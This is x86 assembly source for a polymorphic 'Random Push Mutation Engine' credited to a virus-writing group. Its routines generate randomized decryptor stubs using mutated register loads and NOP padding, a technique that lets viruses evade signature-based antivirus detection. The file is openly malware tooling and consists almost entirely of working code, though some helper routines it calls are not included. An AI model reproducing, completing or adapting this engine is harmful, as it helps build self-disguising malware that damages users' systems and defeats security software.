; Random Push Mutation Engine
;    (c) by RedArc // TAVC
;------------------------------
; Ende procedure RPME
;------------------------------
;Input:
;       ES:DI - output buffer
;Output:
;       CX - length of output buffer
;Destroy:
;       None

RPME_ENDE proc near
     cld
     push ax
     push bx
     push dx
     push si
     push di
     mov ax,0fffch
     mov bp,4
     call NEW_VALUE
     mov ax,MyLength
     mov bp,2
     call NEW_VALUE
     mov ax,100h
     mov bp,5
     call NEW_VALUE
     call CONST_BYTE_1
     mov al,0fdh
     call NOP_MUT
     stosw
     mov al,0adh
     call NOP_MUT
     stosw
     mov al,0fch
     call NOP_MUT
     stosw
     mov al,0abh
     call NOP_MUT
     stosw
     mov ax,0f6e2h
     stosw
     mov al,0c3h
     call NOP_MUT
     stosw
     xchg cx,di
     pop di
     sub cx,di
     pop si
     pop dx
     pop bx
     pop ax
     ret
RPME_ENDE endp


;Input:
;       AL - value
;Output:
;       AX - new value
;Destroy:
;       None
NOP_MUT proc near
        push bx
        push dx
        mov bx,18
        call RND
        cmp dx,9
        jl NM1
        xchg ah,al
        mov al,90h
        jmp short NM2
NM1:
        mov ah,90h
NM2:
        pop dx
        pop bx
        ret
NOP_MUT endp


;Input:
;       AX - value
;       DX - mirror word
;       BP - Num. Reg.
;Output:
;       None
;Destroy:
;       AX, DX
SAVE_BUFF proc near
     push si
     push ax
     call S_B0
S_B0:
     pop si
     add si,bp
     add si,Mov_offs1
     mov al,byte ptr cs:[si]
     stosb
     pop ax
     stosw
     xchg ax,dx
     stosw
     pop si
     ret
Push_offs1 equ $-S_B0 ;byte
push_ax1  db 050h
push_bx1  db 053h
push_cx1  db 051h
push_dx1  db 052h
push_si1  db 056h
push_di1  db 057h
Mov_offs1 equ $-S_B0 ;byte
mov_ax1   db 0b8h
mov_bx1   db 0bbh
mov_cx1   db 0b9h
mov_dx1   db 0bah
mov_si1   db 0beh
mov_di1   db 0bfh
SAVE_BUFF endp

;Input:
;       AX - value
;       BP - Num. Reg.
;Output:
;       None
;Destroy:
;       AX
NEW_VALUE proc near
     push bx
     push dx
P0:
     mov bx,5
     call RND
     xchg bx,dx
     mov dx,bp
     cmp bx,0
     jne P1
     call INCAX
     call SAVE_BUFF
     jmp P7
P1:
     cmp bx,1
     jne P20
     call DECAX
     call SAVE_BUFF
     jmp P7
P20:
     cmp bx,4
     jne P21
     call RORAX
     call SAVE_BUFF
     jmp P7
P21:
     cmp bx,5
     jne P2
     call ROLAX
     call SAVE_BUFF
     jmp P7
P2:
     cmp bx,2
     jne P3
     call NEGAX
     call SAVE_BUFF
     jmp P7
P3:
     cmp bx,3
     je P4
     jmp P0
P4:
     call NOTAX
     call SAVE_BUFF
P7:
     pop dx
     pop bx
     ret
NEW_VALUE endp

;Input:
;       None
;Output:
;       None
;Destroy:
;       AX
CONST_BYTE_1 proc near
     push si
     call C_B_1_0
C_B_1_0:
     pop si
     add si,DATE_CB1
     mov al,byte ptr cs:[si]
     stosb
     inc si
     mov ax,word ptr cs:[si]
     stosw
     pop si
     ret
DATE_CB1 equ $-C_B_1_0
DCB1:
     push di
     shr cx,1
DateLengthCB1 equ $-DCB1
CONST_BYTE_1 endp
